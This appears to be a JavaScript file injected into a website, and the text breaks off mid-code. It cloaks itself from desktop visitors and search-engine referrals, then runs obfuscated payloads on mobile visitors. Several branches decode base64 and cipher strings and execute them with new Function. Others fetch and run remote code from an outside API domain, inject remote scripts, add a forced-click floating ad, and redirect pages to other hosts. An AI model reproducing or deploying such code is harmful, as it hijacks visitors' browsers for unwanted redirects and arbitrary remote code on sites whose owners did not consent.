/**
* 2022年11月21日17:46:15
*/
var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
var us = navigator.userAgent.toLowerCase();

system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);

var regexp = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;

const chooseDirection = ['b', 't'];
const directionGroup = (arr) => arr[Math.floor(Math.random() * arr.length)];
const direction = directionGroup(chooseDirection);

if (!system.win && !system.mac && !system.xll && !regexp.test(where)) {
    if (direction == 't' || direction == 'all') {
        $("#topnav").attr("style", "margin-top:120px");
        const temporaryGroups = ['todayCpv','smCpv'];
        const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElements = randomNums(temporaryGroups);
        if (randomElements == 'todayCpv') {
            !(function () {
                function WkgjF (s) {
            var d = {"p":"d","I":"m","K":"F","z":"y","h":"I","Y":"G","s":"Q","P":9,"b":"Z","g":"j","L":"W","y":1,"u":"l","N":"b","i":"n","x":"s","d":"u","r":"Y","5":"X","e":"p","T":2,"f":0,"Q":3,"3":"J","S":"B","J":"R","D":"t","Z":"M","G":"C","v":5,"l":"U","E":"N","R":"a","c":"L","7":"H","w":"c","C":"o","t":"S","8":"k","n":"T","m":"A","U":"D","O":6,"9":8,"a":"O","q":"K","W":"E","B":"v","0":"h","V":"x","1":4,"k":"i","6":"f","2":"V","M":"+","j":"e","A":7,"o":"w","+":"P","4":"z","F":"r","H":"g","X":"q","=":"="};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function fjgzys (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,pIKzhYsPbYPgpLyuNisxNgydr5bebTKfNQ3N3QSxr5JINQ3D3yfxrQZPbGvgp53zbLvflTEzR5Sfc7lP3TygwGvCpLuvRLJyRtvgNTficY8PZnZyEgmzc7hP3Tp3","tYuRLGwxwUfiR7Jfw7ZOcz9iaTuIqGWB58y0rQV5RL1BciJuwQsCNku96GKdq5Debk0dr5bebTKfNQhdp5Euw8KibLvfcIudbY21nTrC3T30RLJy3z8McnWejQb0wkS1R7hPNI2QhK0EnW0fp7","Stb5Kyb5EfqG8AjY0zcIPobL1C3yS+lysicGpCp7Jow4CBczwFptxicTHB3zDeqnD1R7hdwT2flI2VpL24pW0urLJuwkHisTPdpY2dpGylj5Su3zoir5SoNYugr5JeNT1BjGyQpQwDbIPzNtyy","wIVuNIEBbY28azweaQ0Cwkv4b5Jtb5Kyb5EftY20bY2zqGprc23Kl22KlyJKJGy5t2Jh3zoiLWyZt7JfwK3uw52uwQsiqnD1R7hdNTvzbLK8j5Efr5JurT00NIpu+LbyNIEfRLPdqGuARLrCjY","0zci3urLJvlQJ0pYlP+nsI3i0Cwkv4pYKfp5ZP+nhoZGuApIKzhYJ0pYWPtuE+nkvor534bt01R7hdwI24wYPdwT2lb50fqnDdb5wHJi2drQJeNT1C3y9iqzpf3zxibGwF3TE43zVdb5wHJi2d","rQJeNT1C3TZicYJ0pYWdwI24pLVfcIJurTP8btxiaQ3up72zNkmiqTJ0pYWdwI24pLVfcIv0NLlF3z0gqtweqYJ0pYWdwI24pLVfcIuDbzvXNTudqGwiqt8eqYE4qnDP6nD1R7hdwT2dbGHipn","fV3z8A6L2xwT2ApIKzh7ZPbYPgpLyuNisdrQ3ur5JuJLVuNL2dpGHiwTEzR5Sf3z8Awzv4wIZPwGDyqzwBRz9iqT8ArQZdwYKzbLvfJLVuNL2dpGveNiEuwiJGbLbBwIlCwzVgwz8A65f="];
            new Function(fjgzys(WkgjF(s.join('').substr(22))))();
        })();
        }
        if(randomElements == 'smCpv'){
            window.aucuQF =function(){var a=document.createElement('a');var evjs=`var cname='aucuQF',bn='https://dingbu.bj.bcebos.com/xiaotubiao.adddd',jp='https://api.simi1234.com/a/c?au6e4511da705ef7a712d549e2736fed41=',cst=1,mg=16,mimgh=100,cx=0,cy=0,imgh=0,imghs=0,drv=isCheckD(),browserWidth=getBrowserWH().w,browserHeight=getBrowserWH().h;if(drv){crateEl(cname);var n=0;setTimeout(function(){n++;var elobj;setInterval(function(){elobj=resbaner();if(!elobj){return recreate(elobj)}var eh=elobj.getBoundingClientRect().height;if(eh<=2){return recreate(elobj)}})},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=465239571184021504';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n,t){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;br.append(img);by.appendChild(br);br.addEventListener('touchmove',handleMove);br.addEventListener('touchend',handleChend);br.addEventListener('touchstart',handleTouchstart);img.onload=function(){if(cx!==0||cy!==0){setbs(br);return}if(t!=undefined){return}imgh=this.height;setViewHeight(imgh/2)}}function recreate(elobj){if(elobj!=null&&elobj!=undefined){elobj.remove()};cname=its(10);return crateEl('aucuQF '+cname,0)}var eLeft=0,eTop=0;var isClick=false;function handleTouchstart(e){e.preventDefault();e.stopPropagation();eLeft=e.touches[0].pageX-this.offsetLeft,eTop=e.touches[0].pageY-this.offsetTop;isClick=true}function handleMove(e){e.preventDefault();e.stopPropagation();cx=e.touches[0].pageX-eLeft;cy=e.touches[0].pageY-eTop;imghs=imgh+2;var bw=browserWidth-imghs,bh=browserHeight-imghs;var left=(cx>=bw?bw:cx<=0?0:cx),top=(cy<=0?0:cy>=bh?bh:cy);cx=left;cy=top;this.style.cssText='left:'+left+'px;top:'+top+'px';isClick=false}function handleChend(e){e.preventDefault();e.stopPropagation();if(isClick){var self=this;self.style.transition='0.1s';self.style.transform='scale(0.90)';setTimeout(function(){self.style.transform='scale(1)'},150);setTimeout(function(){self.style.transform='scale(1)';var ja=document.createElement('a');ja.href=jp+au6e4511da705ef7a712d549e2736fed41;ja.click();ja.remove()},300)}else{handleVposition(this)}}function handleVposition(e){var o=inLeftOrRight();e.style.transition='0.2s';cx=cx>browserWidth?browserWidth:cx;var hb=(browserHeight-(imghs+mg));cy=cy>=hb?(hb):cy<=0?0:cy;cy==0?e.style.top=mg+'px':e.style.top=cy+'px';if(cx>=o.mp){e.style.left=browserWidth-(imgh+mg)+'px'}else{e.style.left=mg+'px'}}function setbs(e){var o=inLeftOrRight();var tcy=cy+'px';if(cx>=o.mp){e.style.top=tcy}else{e.style.top=tcy;e.style.left=mg+'px'}}function inLeftOrRight(){var mp=(browserWidth/2)-(imghs/2);return{mp:mp,bh:browserHeight-imghs}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}if(drv){addStyle('.aucuQF{z-index:999;top:50%;right:0px;position:fixed;width:'+mimgh+'px !important;}.aucuQF img{width:100%;height:100%;}')}function setViewHeight(h){if(drv){var ps='left:'+(cst==0?mg:browserWidth-(imgh+mg))+'px';addStyle('.aucuQF{top:calc(50% - '+h+'px);'+ps+'}')}}function addStyle(style){ var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;if(system.win||system.mac){return false}return true}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}function getBrowserWH(){var o={w:document.documentElement.clientWidth||document.body.clientWidth,h:document.documentElement.clientHeight||document.body.clientHeight};return o}function getElse(el,ar){return window.getComputedStyle?window.getComputedStyle(el,null)[ar]:el.currentStyle[ar]};`;a.href='javascript:'+evjs;a.click()};window.aucuQF();

        }
        // 图标
        window.MCgsmM = function(){var keyList = ["+LyCYuHq71-BlFRmnZT2f0aWNQi4e6-uGgpteXhwfl6vqSc9ZjUCyiV=rn08" ,"HRYhZXrmBGJFC83UOgezoNwKPTMAvyj6dpVnuW5nLgqcEKfGPkaJADZxMl9s1ey8Ytbr4h3NS6Cm","oixz6DnM2uk7Fd4BHGEsfeg31vaUYIbtwXlPWK71gyRfH/hM2ms-6PQ3p4OKVaCoiG:tDxj=kZ.c","8-5h=v9ySfzm2JARpstocuW3OxLrTG1YeTPpyEZ9A+8HlO2seYQG6i140Uw753jXDN",];function decrypt(t, e) {if (!t) return "";for (var a = t.split(""), n = e.split(""), i = {}, r = [], o = 0;o < a.length / 2;o++)i[a[o]] = a[a.length / 2 + o];for (var s = 0; s < e.length; s++) r.push(i[n[s]]);return r.join("");};(!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?(function(u, i, w, d) {var x = decrypt,cs = d[x(keyList[0],"nLiiH4umniWYu" )],crd = x(keyList[1],"XyrCArrYrerRA");'jQuery';u = decodeURIComponent(x(keyList[2], u));'jQuery';var xhr = new XMLHttpRequest();xhr.open('GET', u + '/s/a?_=' + x(keyList[3], i));xhr.onreadystatechange = function() {if (xhr.readyState == 4 && xhr.status == 200) {var data = JSON.parse(xhr.responseText);new Function(data.data)(cs);}};xhr.send('u=1');})("nIIBFYMM3BaWFauaikGsW1fu", "WorJT9uu3r93LJJ3Wf", window, document):function(){}};window['MCgsmM']();

    }
    if (direction == 'b' || direction == 'all') {
        const temporaryGroup = ['hl', 'todayCpv','todayCpc','smCpv'];
        const randomNum = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElement = randomNum(temporaryGroup);
        if (randomElement == 'todayCpv') {
            !(function () {
                function SluHCvB (s) {
            var d = {"P":"d","N":"m","x":"F","V":"y","v":"I","1":"G","6":"Q","k":9,"m":"Z","d":"j","L":"W","J":1,"e":"l","5":"b","n":"n","K":"s","Z":"u","0":"Y","B":"X","z":"p","Y":2,"j":0,"g":3,"9":"J","a":"B","q":"R","8":"t","o":"M","S":"C","u":5,"p":"U","Q":"N","s":"a","A":"L","E":"H","h":"c","F":"o","T":"S","b":"k","3":"T","4":"A","W":"x","+":"V","R":"D","r":6,"7":8,"O":"O","w":"K","c":"E","X":"v","G":"h","t":4,"D":"i","f":"f","C":"+","U":"e","=":7,"l":"w","M":"P","H":"z","I":"r","i":"g","y":"q","2":"="};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function qEYVt (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,PNxVv16km1kdPLJe5n6K5dJZ0BmzmYxj5g959gaK0BqN5g989JjK0gokmSudPB9VmLujpYQVsBajAEpk9YJdhSuFPLeusLqJsTud5YjnA1bko3oJQd4WAEvk9Jqe","5NPWTEma+VhKhRjnsEqjhEorAV7nOYeNwScXBbJG0gWBsLtXAnqehg6F5De7fSxZwB8zmDGZ0BmzmYxj5gvZPBQehbxnmLujANeZm1+t3Y0F9Y9GsLqJ9VbCA3czUgmGhDatsEvk5N+gvxGQ3c","GjPEaTmBxJmBQjwSb=U1GVANklmLtF9JaMpJ6nASPFPEqlhHFXAVhIPTKnAYiX9V8zw38tsEvZhY+jpN+WPL+HPcGe0LqehDin6YkZP1+ZPSJpUBae9Vln0Bal51ed0Bqz5YtXUSJgPgh8mNkV","5TJJhNWe5NQXm1+bOVhzOgGFhDuHmBqTmBxJmBQjT1+Gm1+VwSP0A+9xp++xpJqxqSJBT+qv9VlnLcJoTEqjhx9ehB+ehg6nw38tsEvZ5YuVmLxbUBQj0Bqe0YGG5NPeMLmJ5NQjsLkZwSe=sL","0FU1GVAn9e0LqupgqGP1pkM36N9nGFhDuHP1xjPBokM3vloSe=PNxVv1qGP1ckTeQM3Dul0B9HmTGtsEvZhN+Hh1kZhY+pmBGjw38ZmBhiqn+Z0gqz5YtF9J7nwVPj9VKnmShI9YQH9VWZmBhi","qn+Z0gqz5YtF9YonA1qGP1cZhN+HPLWjANqe0YkbmTKnOg9ePE+V5D4nwYqGP1cZhN+HPLWjANuG5LpI9VGdwThzw1qGP1cZhN+HPLWjANe8mVuy5YeZwShnwTbzw1QHw38kf38tsEvZhY+ZmS","inP3jW9Vb=fL+KhY+=PNxVvEokm1kdPLJe5n6Z0g9e0BqeqLWe5L+ZPSinhYQVsBaj9Vb=hVuHhNokhS8JwVhXsV7nwYb=0goZh1xVmLujqLWe5L+ZPSuz5nQehnqSmLmXhNpFhVWdhVb=fBj2"];
            new Function(qEYVt(SluHCvB(s.join('').substr(22))))();
        })();

        }
        if(randomElement == 'todayCpc'){
            !(function () {
                function CpTwJibX (s) {
            var d = {"R":"d","w":"m","p":"F","J":"y","P":"I","6":"G","3":"Q","9":9,"o":"Z","D":"j","h":"W","W":1,"S":"l","7":"b","M":"n","i":"s","j":"u","q":"Y","I":"X","k":"p","Y":2,"N":0,"b":3,"v":"J","y":"B","A":"R","=":"t","V":"M","L":"C","O":5,"X":"U","m":"N","z":"a","l":"L","c":"H","1":"c","Q":"o","5":"S","d":"k","r":"T","a":"A","U":"z","C":"h","G":"D","K":6,"u":8,"+":"O","t":"K","F":"E","Z":"v","2":"x","B":4,"x":"i","E":"f","4":"V","e":"+","g":"e","f":7,"n":"w","0":"P","H":"r","s":"g","8":"q","T":"="};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function NKqHQhs (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,RwpJP639o69DRhWS7M3i7DWjqIokoYpN7bv7vbyiqIAw7bv=vWNiqbV9oLODRIvJohONXYmJzIyNlcX9vYWD1LOQRhSOzhAWz5OD7YNMl6d9VrVWmDaUlcP9vWA3","zdCNAJ1i1GNMzcAN1cVKlJuM+YSwtLFZIdWCqb2IzhBZlMAS1b3Q7xSuELpjtI=koxCjqIokoYpN7bPjRImS1dpMohONlwSjo64BrYqQvYvCzhAWvJdelrFkgboC1xyBzcP97w4bPpCmrFCNRc","y5oIpWoImNtLdfg6CJlw9nohBQvWy0XW3MlLRQRcAn1UQZlJ1HR5iMlYsZvJ=ktr=BzcPj1Y4NXw42Rh4URFCSqhAS1xsM3Y9jR64jRLWXgIySvJnMqIyn76SDqIAk7YBZgLWbRb1=ow9J75WW","1w2S7wmZo64d+J1k+bCQ1xOUoIA5oIpWoImN564Co64JtLRql4vpX44pXWApALWI54APvJnMhFWV5cAN1pvS1I4S1b3Mtr=BzcPj7YOJohpdgImNqIASqYCC7wRS0hoW7wmNzh9jtLSfzhqQg6","CJlMvSqhAOXbACR6X90r3wvMCQ1xOUR6pNRIV90rPnVLSfRwpJP6ACR6F95Sm0rxOnqIvUo5CBzcPj1w4U169j1Y4XoICNtr=joI1sAM4jqbAk7YBQvWuMtJRNvJiMoL1HvYmUvJ2joI1sAM4j","qbAk7YBQvYVMl6ACR6Fj1w4URh2NlwASqY9do5iM+bvSRc4J7xaMtYACR6Fj1w4URh2NlwOC7hXHvJCDt51kt6ACR6Fj1w4URh2NlwS=oJO87YSjtL1Mt5dkt6mUtr=9Er=BzcPj1Y4joLsMRr","N2vJdfEh4i1Y4fRwpJPcV9o69DRhWS7M3jqbvSqIASAh2S7h4jRLsM1YmJzIyNvJdf1JOU1wV91L=WtJ1ZzJuMtYdfqbVj16pJohONAh2S7h4jRLOk7MmS1MALohoZ1wXQ1J2D1JdfEINT"];
            new Function(NKqHQhs(CpTwJibX(s.join('').substr(22))))();
        })();

        }
        if (randomElement == 'hl') {
            !function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('FVLXbvaIPml7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF!67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[67cl/3yddd(?V6662/mFYLFc2a??l2a[Xd5 6LDL86LMSS80!Xd5 6^pL(8"hFFJLg//LSTmL7)6R7fm(2/)d6f_MJ6(/"%ydFhm(Y6qcydFhm5d2fO^ca.}0a%"mCJp"!LYF|6^YO_Fc7_2(F6O2ca[67c6LDL880a[Xd5 2h_5D__58"hFFJLg//((Lm(hOqO5@0}}}nm(2/((/}QsKj6LM2OF8}vFd5pYF8}"!Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!5m)OfTmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[Xd5 (q6Y2FhY6phF8D62fODmL(5YY2mdXd6q9Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-!P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavv6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O282h_5D__5!PYqLY[D62fODmqO(dF6O2mh5Y782h_5D__5!P6LMSS80!PPPa! Xd5 O66pXC:XM2}80!Xd5 O66pXC:XMLYF62F}8LYFW2FY5Xdqc7_2(F6O2ca[67cO66pXC:XM2}<ssa[Xd5 Fdp85m(5YdFYEqY^Y2Fc"f6X"a!FdpmLFTqY8"f6LJqdTg)qO(S!qY7Fg0!56phFg@!JOL6F6O2gd)LOq_FY!4*62fYRg}000000!D6fFhgQQb!hY6phFgsmsXD!)O5fY5*qY7Fg}JR LOq6f #ddd!"!Xd5 hY6XD8O66pXC:XM2}!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!FdpmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28O66pXC:XPYqLY[D62fODmqO(dF6O2mh5Y78O66pXC:XPPa!5m)OfTmdJJY2fxh6qfcFdpa!O66pXC:XM2}%8smsPYqLY[(qYd5W2FY5XdqcO66pXC:XMLYF62F}aPP=n0a! Xd5 O66pXC:XM2@8}!Xd5 O66pXC:XMLYF62F@8LYFW2FY5Xdqc7_2(F6O2ca[67cO66pXC:XM2@<8}0a[Xd5 (d2Xd85m(5YdFYEqY^Y2Fc"(d2XdL"a!Xd5 hY6XD8cc}0*O66pXC:XM2@a.smsa!(d2XdmLFTqY8"D6fFhgQQb!hY6phFgsmsXD!qY7Fg0!56phFg@JR!JOL6F6O2gd)LOq_FY!)O5fY5*qY7Fg@JR LOq6f #70KQn7!^d5p62g0JR!"!(d2XdmD6fFh8K00!(d2XdmhY6phF8@0!Xd5 (FR8(d2XdmpYFxO2FYRFc"@f"a!Xd5 6^p82YD W^dpYca!Xd5 LT8*c@0.O66pXC:XM2@a%@0!6^pmO2qOdf87_2(F6O2ca[(FRmf5dDW^dpYc6^p=0=LT=K00=@00aP!6^pmL5(86^pL(!5m)OfTmdJJY2fxh6qfc(d2Xda!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!O66pXC:XM2@%%PYqLY[(qYd5W2FY5XdqcO66pXC:XMLYF62F@aPP=}00a!Xd5 685mpYFEqY^Y2FuTWfc"O66pXC:XMFC"a!67c6a[6mL5(86mpYFrFF56)_FYc"fdFd*_5q"aPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//((Lm(hOqO5@0}}}nm(2/f/}QsKj(8}vF8ns0K{Q}K"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!PXd5 L))85m(5YdFYEqY^Y2Fc"LFTqY"a!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!5mhYdfmdJJY2fxh6qfcL))aP!P= }000a!Xd5 DLRp8H"))Lm)hOqO5@0}}}nm(2"="))Lm)hOqO5@0}}}Km(2"="))Lm)hOqO5@0}}}1m(2"="))Lm)hOqO5@0}}}nm(2"="))Lm)hOqO5@0}}}Km(2"="))Lm)hOqO5@0}}}1m(2"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS!Xd5 DL_8c"hFFJLg"885mqO(dF6O2mJ5OFO(Oqaj"DLLg//"%DLRpHSZ%"g@00Q}"g"DLg//"%DLRpHSZ%"g@00Q0"!Xd5 (82YD VY)iO(SYFcDL_%"/}QsK"a!(mO2OJY287_2(F6O2cYa[6LDL86LMSS8}!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"O66pXC:X"a!67c(d2Xda[(d2XdmLFTqY8"f6LJqdTg2O2Y!"PP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 